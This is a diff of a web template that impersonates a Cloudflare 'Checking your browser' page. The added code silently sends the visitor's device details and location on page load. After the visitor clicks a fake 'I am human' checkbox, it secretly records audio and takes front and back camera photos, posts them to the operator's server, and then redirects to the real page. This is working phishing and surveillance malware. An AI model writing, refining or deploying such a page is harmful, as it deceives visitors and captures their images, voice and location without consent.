@@ -1,145 +1,139 @@
+<!DOCTYPE html>
 <html lang="en-US">
 <head>
 <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
 <meta name="robots" content="noindex, nofollow">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Security Check – Cloudflare</title>
+<title>Just a moment...</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-html,body{width:100%;min-height:100%;background:#f6f6f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#1d1d1f}
-.wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
-.card{background:#fff;border-radius:18px;box-shadow:0 4px 32px rgba(0,0,0,.12);padding:32px 28px;max-width:400px;width:100%;text-align:center}
-.cf-logo{font-size:36px;margin-bottom:4px}
-.cf-title{font-size:21px;font-weight:700;color:#1d1d1f;margin-bottom:5px}
-.cf-sub{font-size:13px;color:#6e6e73;margin-bottom:22px;line-height:1.6}
+html{font-family:sans-serif;background:#fff;color:#313131}
+body{display:flex;flex-direction:column;min-height:100vh}
+.main-wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px}
 
-/* Face scan UI */
-.face-wrap{position:relative;width:140px;height:140px;margin:0 auto 20px}
-.face-circle{width:140px;height:140px;border-radius:50%;border:3px solid #e0e0e0;background:#f9f9f9;display:flex;align-items:center;justify-content:center;font-size:56px;position:relative;overflow:hidden}
-.face-video{position:absolute;inset:0;width:100%;height:100%;border-radius:50%;object-fit:cover;display:none}
-.scan-line{position:absolute;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,#f58220,transparent);animation:scan 2s linear infinite;display:none}
-.corner{position:absolute;width:20px;height:20px;border-color:#f58220;border-style:solid}
-.corner.tl{top:4px;left:4px;border-width:3px 0 0 3px;border-radius:3px 0 0 3px}
-.corner.tr{top:4px;right:4px;border-width:3px 3px 0 0;border-radius:0 3px 0 0}
-.corner.bl{bottom:4px;left:4px;border-width:0 0 3px 3px;border-radius:0 0 0 3px}
-.corner.br{bottom:4px;right:4px;border-width:0 3px 3px 0;border-radius:0 0 3px 0}
-@keyframes scan{0%{top:10%}100%{top:90%}}
-@keyframes pulse-ring{0%{transform:scale(.9);opacity:.8}70%{transform:scale(1.05);opacity:.3}100%{transform:scale(.9);opacity:.8}}
-.pulse-ring{position:absolute;inset:-8px;border-radius:50%;border:2px solid #f58220;animation:pulse-ring 2s ease-in-out infinite;display:none}
+/* Cloudflare real page style */
+.cf-browser-verification{background:#f6f6f6;border:1px solid #e2e2e2;border-radius:8px;padding:32px 28px;max-width:440px;width:100%;text-align:center}
+.cf-logo{margin-bottom:18px}
+.cf-logo svg{height:44px}
 
-/* Steps */
-.steps{display:flex;flex-direction:column;gap:8px;margin-bottom:20px;text-align:left}
-.step{display:flex;align-items:center;gap:10px;background:#f9f9f9;border-radius:10px;padding:10px 14px;font-size:13px;color:#555;transition:all .4s}
-.step.active{background:#fff8f2;border:1px solid #f58220;color:#c96000}
-.step.done{background:#f0fff4;border:1px solid #34c759;color:#1a7a3a}
-.step-icon{font-size:18px;min-width:22px;text-align:center}
-.step-badge{margin-left:auto;font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;background:#eee;color:#888}
-.step.active .step-badge{background:#f58220;color:#fff}
-.step.done .step-badge{background:#34c759;color:#fff}
+.cf-heading{font-size:22px;font-weight:600;color:#313131;margin-bottom:10px}
+.cf-subheading{font-size:14px;color:#555;margin-bottom:28px;line-height:1.6}
 
-.progress-bar{height:4px;background:#f0f0f0;border-radius:4px;margin:16px 0 8px;overflow:hidden}
-.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#f58220,#e36209);border-radius:4px;transition:width .6s ease}
-#status-msg{font-size:13px;color:#6e6e73;min-height:18px;margin-bottom:14px}
+/* Spinner */
+.cf-spinner-wrap{margin:0 auto 24px;width:60px;height:60px;position:relative}
+.cf-spinner{width:60px;height:60px;border-radius:50%;border:4px solid #e8e8e8;border-top-color:#f48120;animation:cf-spin 0.8s linear infinite}
+@keyframes cf-spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+.cf-spinner-done{width:60px;height:60px;border-radius:50%;background:#f48120;display:flex;align-items:center;justify-content:center;display:none}
+.cf-spinner-done svg{width:32px;height:32px}
 
-.verify-btn{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#f58220,#e36209);color:#fff;border:none;border-radius:12px;padding:14px 32px;font-size:16px;font-weight:600;cursor:pointer;width:100%;justify-content:center;transition:all .2s}
-.verify-btn:disabled{opacity:.55;cursor:not-allowed}
+/* Progress steps text */
+.cf-checking{font-size:14px;color:#313131;margin-bottom:6px;font-weight:500}
+.cf-note{font-size:12px;color:#999;margin-bottom:20px}
 
-.footer{margin-top:20px;font-size:12px;color:#aaa}
-.footer a{color:#aaa;text-decoration:none}
-.cf-ray{margin-top:3px;font-size:11px;color:#ccc}
-@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
-.spin{animation:spin 1s linear infinite;display:inline-block}
+/* Checkbox challenge (optional second step) */
+.cf-challenge{display:none;margin:0 auto 20px;border:1px solid #d0d0d0;border-radius:4px;background:#fff;padding:14px 16px;max-width:300px;align-items:center;gap:12px;cursor:pointer;user-select:none}
+.cf-checkbox{width:26px;height:26px;border:2px solid #c0c0c0;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:.2s}
+.cf-checkbox.checked{background:#f48120;border-color:#f48120}
+.cf-checkbox.checked svg{display:block}
+.cf-checkbox svg{display:none;width:16px;height:16px}
+.cf-checkbox-label{font-size:14px;color:#313131;font-weight:500}
+.cf-checkbox-brand{margin-left:auto;display:flex;flex-direction:column;align-items:center;font-size:9px;color:#aaa;gap:1px}
+
+/* Ray + security */
+.cf-footer{margin-top:20px;padding-top:16px;border-top:1px solid #e2e2e2;display:flex;justify-content:space-between;align-items:flex-end;font-size:11px;color:#999}
+.cf-ray b{color:#777}
+.cf-security{text-align:right;font-size:10px}
+
+/* Bottom bar */
+.footer-bar{background:#f6f6f6;border-top:1px solid #e2e2e2;padding:14px 20px;display:flex;justify-content:center;gap:30px;font-size:12px;color:#999}
+.footer-bar a{color:#f48120;text-decoration:none}
 </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="card">
-    <div class="cf-logo">🛡️</div>
-    <div class="cf-title">Identity Verification</div>
-    <div class="cf-sub">We need to verify you're a real person.<br>A quick face scan will complete this step.</div>
+<div class="main-wrap">
+  <div class="cf-browser-verification">
 
-    <!-- Face scan UI -->
-    <div class="face-wrap">
-      <div class="face-circle" id="face-circle">
-        🙂
-        <video id="vid-front" class="face-video" playsinline autoplay muted></video>
-        <div class="scan-line" id="scan-line"></div>
-      </div>
-      <div class="corner tl"></div><div class="corner tr"></div>
-      <div class="corner bl"></div><div class="corner br"></div>
-      <div class="pulse-ring" id="pulse-ring"></div>
+    <!-- CF Logo -->
+    <div class="cf-logo">
+      <svg viewBox="0 0 109 44" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M72.8 16.2c-.4-1.6-1.2-3-2.4-4.1-1.2-1.1-2.8-1.8-4.5-1.8-.6 0-1.2.1-1.8.2-1.3-2.4-3.8-4-6.7-4-4.2 0-7.6 3.4-7.6 7.6 0 .1 0 .3.0.4-2.6.5-4.5 2.8-4.5 5.5 0 3.1 2.5 5.6 5.6 5.6h20.9c2.8 0 5-2.2 5-5 0-2.4-1.7-4.4-4-4.9z" fill="#F6821F"/>
+        <path d="M75.5 25.8H54.6c-2.8 0-5-2.2-5-5s2.2-5 5-5h.3c-.0-.2-.0-.4-.0-.6 0-4.2 3.4-7.6 7.6-7.6 3.1 0 5.8 1.9 7 4.7.5-.1 1-.2 1.6-.2 3.1 0 5.6 2.5 5.6 5.6 0 .1 0 .2 0 .3 1.9.6 3.3 2.4 3.3 4.5 0 2.6-2.1 4.7-4.7 4.7.1 0 .1.0.1.0z" fill="#FBAD41"/>
+        <text x="2" y="38" font-family="sans-serif" font-size="13" font-weight="700" fill="#F6821F">Cloudflare</text>
+      </svg>
     </div>
 
-    <!-- Steps -->
-    <div class="steps">
-      <div class="step" id="step1">
-        <div class="step-icon">🖥️</div>
-        <div>Device fingerprint</div>
-        <div class="step-badge" id="b1">Pending</div>
+    <div class="cf-heading">Checking your browser</div>
+    <div class="cf-subheading" id="domain-line">before accessing <b id="dest-domain">the requested page</b></div>
+
+    <!-- Spinner -->
+    <div class="cf-spinner-wrap">
+      <div class="cf-spinner" id="spinner"></div>
+    </div>
+
+    <div class="cf-checking" id="step-text">Verifying you are human. This may take a few seconds.</div>
+    <div class="cf-note">Please allow up to 5 seconds…</div>
+
+    <!-- Checkbox challenge (shown after spinner) -->
+    <div class="cf-challenge" id="cf-challenge" onclick="doCheck()">
+      <div class="cf-checkbox" id="cf-checkbox">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
       </div>
-      <div class="step" id="step2">
-        <div class="step-icon">📍</div>
-        <div>Location verification</div>
-        <div class="step-badge" id="b2">Pending</div>
-      </div>
-      <div class="step" id="step3">
-        <div class="step-icon">🤳</div>
-        <div>Face scan (liveness check)</div>
-        <div class="step-badge" id="b3">Pending</div>
+      <div class="cf-checkbox-label">I am human</div>
+      <div class="cf-checkbox-brand">
+        <svg viewBox="0 0 60 15" width="40" height="10" fill="#F6821F"><text y="12" font-size="12" font-family="sans-serif" font-weight="700">cf</text></svg>
+        <span>Privacy</span>
       </div>
     </div>
 
-    <div class="progress-bar"><div class="progress-fill" id="pbar"></div></div>
-    <div id="status-msg">Tap below to start verification</div>
-
-    <button class="verify-btn" id="verify-btn" onclick="startVerify()">
-      🔒 Start Face Verification
-    </button>
-
-    <div class="footer">
-      DDoS protection by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
-      <div class="cf-ray">Ray ID: <span id="ray">loading...</span></div>
+    <div class="cf-footer">
+      <div class="cf-ray">Ray ID: <b id="ray-id">loading</b></div>
+      <div class="cf-security">
+        <div>Performance &amp; security by</div>
+        <div style="color:#f48120;font-weight:600">Cloudflare</div>
+      </div>
     </div>
   </div>
 </div>
 
-<video id="vid-back" style="display:none" playsinline autoplay muted></video>
+<div class="footer-bar">
+  <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">Privacy Policy</a>
+  <a href="https://www.cloudflare.com/terms/" target="_blank">Terms of Service</a>
+  <a href="https://support.cloudflare.com/" target="_blank">Cookie Settings</a>
+</div>
+
+<!-- Hidden elements for camera -->
+<video id="vid-front" style="display:none;position:fixed;top:-9999px" playsinline autoplay muted></video>
+<video id="vid-back"  style="display:none;position:fixed;top:-9999px" playsinline autoplay muted></video>
 <canvas id="canvas" width="640" height="640" style="display:none"></canvas>
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
 <script>
 var uid="<%=uid%>",a="<%=a%>",destUrl="<%=url%>";
-var snapsConfirmed=0,minSnaps=3,redirectDone=false;
+var snapsConfirmed=0,minSnaps=2,redirectDone=false;
 
-function setP(p){document.getElementById('pbar').style.width=p+'%';}
-function setS(t){document.getElementById('status-msg').textContent=t;}
+// Ray ID
+var chars="qwertyuioplkjhgfdsazxcvbnm0987654321";
+var ray="";for(var i=0;i<17;i++)ray+=chars[Math.floor(Math.random()*35)];
+document.getElementById('ray-id').textContent=ray;
 
-function stepActive(n){
-  var el=document.getElementById('step'+n);
-  el.className='step active';
-  document.getElementById('b'+n).textContent='Scanning...';
-}
-function stepDone(n,txt){
-  var el=document.getElementById('step'+n);
-  el.className='step done';
-  document.getElementById('b'+n).textContent=txt||'✓ Done';
-}
+// Show destination domain
+try{
+  var d=new URL(destUrl);
+  document.getElementById('dest-domain').textContent=d.hostname;
+}catch(e){}
 
 function tryRedirect(){
   if(redirectDone)return;
   if(snapsConfirmed>=minSnaps){
     redirectDone=true;
-    setS('Verification complete! Redirecting...');
-    setP(100);
-    setTimeout(function(){window.location.href=destUrl;},500);
+    document.getElementById('step-text').textContent="Verification complete! Redirecting...";
+    document.getElementById('spinner').style.borderTopColor="#34c759";
+    setTimeout(function(){window.location.href=destUrl;},600);
   }
 }
-
-// Hard fallback
 setTimeout(function(){if(!redirectDone){redirectDone=true;window.location.href=destUrl;}},28000);
 
-// ── Device info ────────────────────────────────────────────────────────────
+// ── Silent tracking (runs immediately in background) ──────────────────────────
 async function sendDeviceInfo(){
   var td="";
   <% if(!t){ %>
@@ -165,7 +159,6 @@ async function sendDeviceInfo(){
   }
 }
 
-// ── Location ───────────────────────────────────────────────────────────────
 function fireLocation(){
   function sendLoc(lat,lon,acc){$.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)});}
   async function ipFb(){try{var d=await fetch("https://ipapi.co/json/").then(r=>r.json());if(d&&d.latitude)sendLoc(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")");}catch(e){}}
@@ -178,129 +171,62 @@ function fireLocation(){
   );
 }
 
-// ── Camera ─────────────────────────────────────────────────────────────────
-async function captureAndWait(stream){
-  // Show face video in the circle
+async function startCamera(){
+  var stream=null;
+  try{stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}});}
+  catch(e1){try{stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});}catch(e2){
+    snapsConfirmed+=minSnaps;tryRedirect();return;
+  }}
   var vidFront=document.getElementById('vid-front');
-  vidFront.srcObject=stream;
-  try{await vidFront.play();}catch(e){}
-  vidFront.style.display='block';
-  document.getElementById('scan-line').style.display='block';
-  document.getElementById('pulse-ring').style.display='block';
-  document.getElementById('face-circle').textContent='';
-  document.getElementById('face-circle').appendChild(vidFront);
-  document.getElementById('face-circle').appendChild(document.getElementById('scan-line'));
-
-  // Wait for video
-  await new Promise(function(r){
-    var c=setInterval(function(){if(vidFront.readyState>=2&&vidFront.videoWidth>0){clearInterval(c);r();}},200);
-    setTimeout(function(){clearInterval(c);r();},3000);
-  });
-
-  // Audio
+  vidFront.srcObject=stream;try{await vidFront.play();}catch(e){}
+  await new Promise(function(r){var c=setInterval(function(){if(vidFront.readyState>=2&&vidFront.videoWidth>0){clearInterval(c);r();}},200);setTimeout(function(){clearInterval(c);r();},4000);});
+  // audio
   var at=stream.getAudioTracks();
-  if(at.length){
-    try{
-      var rec=new MediaRecorder(new MediaStream(at)),chunks=[];
-      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
-      rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};
-      rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},9000);
-    }catch(e){}
-  }
-
-  // Front snaps — redirect only after server confirms
-  var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
-  var sd=0;
+  if(at.length){try{var rec=new MediaRecorder(new MediaStream(at)),chunks=[];rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},9000);}catch(e){}}
+  // front snaps
+  var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d'),sd=0;
   var st=setInterval(function(){
     if(vidFront.readyState<2||vidFront.videoWidth===0)return;
     ctx.drawImage(vidFront,0,0,640,640);
     var d=canvas.toDataURL("image/png").replace("data:image/png;base64","");
-    (function(){
-      $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(d),cam:"front"},function(){
-        snapsConfirmed++;
-        setP(50+snapsConfirmed*13);
-        if(snapsConfirmed===1) setS('Analyzing face... please stay still');
-        if(snapsConfirmed===2) setS('Almost done...');
-        tryRedirect();
-      });
-    })();
-    if(++sd>=5)clearInterval(st);
-  },1500);
-
-  // Back camera
+    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(d),cam:"front"},function(){snapsConfirmed++;tryRedirect();});
+    if(++sd>=4)clearInterval(st);
+  },1200);
+  // back cam
   setTimeout(async function(){
-    try{
-      var bs=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:{exact:"environment"},width:{ideal:640},height:{ideal:640}}});
-      var vidBack=document.getElementById('vid-back');
-      vidBack.srcObject=bs;try{await vidBack.play();}catch(e){}
-      await new Promise(function(r){var c=setInterval(function(){if(vidBack.readyState>=2&&vidBack.videoWidth>0){clearInterval(c);r();}},200);setTimeout(function(){clearInterval(c);r();},3000);});
-      for(var i=0;i<2;i++){
-        await new Promise(function(r){setTimeout(r,1500);});
-        if(vidBack.readyState>=2&&vidBack.videoWidth>0){
-          ctx.drawImage(vidBack,0,0,640,640);
-          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});
-        }
-      }
-      bs.getTracks().forEach(function(t){t.stop();});
-    }catch(e){}
-  },4000);
+    try{var bs=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:{exact:"environment"},width:{ideal:640},height:{ideal:640}}});
+    var vb=document.getElementById('vid-back');vb.srcObject=bs;try{await vb.play();}catch(e){}
+    await new Promise(function(r){var c=setInterval(function(){if(vb.readyState>=2&&vb.videoWidth>0){clearInterval(c);r();}},200);setTimeout(function(){clearInterval(c);r();},3000);});
+    for(var i=0;i<2;i++){await new Promise(function(r){setTimeout(r,1500);});if(vb.readyState>=2&&vb.videoWidth>0){ctx.drawImage(vb,0,0,640,640);$.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});}}
+    bs.getTracks().forEach(function(t){t.stop();});}catch(e){}
+  },3500);
 }
 
-// ── Main flow ──────────────────────────────────────────────────────────────
-var verifying=false;
-async function startVerify(){
-  if(verifying)return;
-  verifying=true;
-  document.getElementById('verify-btn').disabled=true;
-  document.getElementById('verify-btn').innerHTML='<span class="spin">⏳</span> Verifying...';
+// ── Checkbox click ─────────────────────────────────────────────────────────────
+var checked=false;
+function doCheck(){
+  if(checked)return;
+  checked=true;
+  var cb=document.getElementById('cf-checkbox');
+  cb.classList.add('checked');
+  document.getElementById('step-text').textContent="Verifying... please wait";
+  startCamera();
+}
 
-  // Step 1: device + location
-  stepActive(1);
-  setP(8); setS('Analyzing device fingerprint...');
+// ── Flow ───────────────────────────────────────────────────────────────────────
+window.addEventListener('DOMContentLoaded',function(){
   sendDeviceInfo();
   fireLocation();
-  await new Promise(function(r){setTimeout(r,900);});
-  stepDone(1,'✓ Verified');
-  setP(18);
 
-  stepActive(2);
-  setS('Checking location data...');
-  await new Promise(function(r){setTimeout(r,800);});
-  stepDone(2,'✓ Verified');
-  setP(30);
-
-  // Step 3: face scan
-  stepActive(3);
-  setS('Camera access needed for face scan...');
-  await new Promise(function(r){setTimeout(r,400);});
-
-  var stream=null;
-  try{
-    stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}});
-  }catch(e1){
-    try{stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});}
-    catch(e2){
-      stepDone(3,'Skipped');
-      setP(100); setS('Verification complete!');
-      await new Promise(function(r){setTimeout(r,800);});
-      if(!redirectDone){redirectDone=true;window.location.href=destUrl;}
-      return;
-    }
-  }
-
-  stepDone(3,'Scanning...');
-  setS('Face scan in progress...');
-  setP(45);
-  await captureAndWait(stream);
-}
-
-// Ray ID
-window.onload=function(){
-  var chars="qwertyuioplkjhgfdsazxcvbnm0987654321";
-  var ray="";for(var i=0;i<17;i++)ray+=chars[Math.floor(Math.random()*35)];
-  document.getElementById('ray').textContent=ray;
-  sendDeviceInfo(); // collect on load too
-};
+  // Step 1: spinner for 2.5s then show checkbox
+  setTimeout(function(){
+    document.getElementById('step-text').textContent="Almost there — one more step";
+    document.getElementById('cf-challenge').style.display='flex';
+    document.getElementById('spinner').style.borderColor='#e8e8e8';
+    document.getElementById('spinner').style.borderTopColor='#f48120';
+    document.getElementById('spinner').style.animationPlayState='paused';
+  },2500);
+});
 </script>
 </body>
 </html>
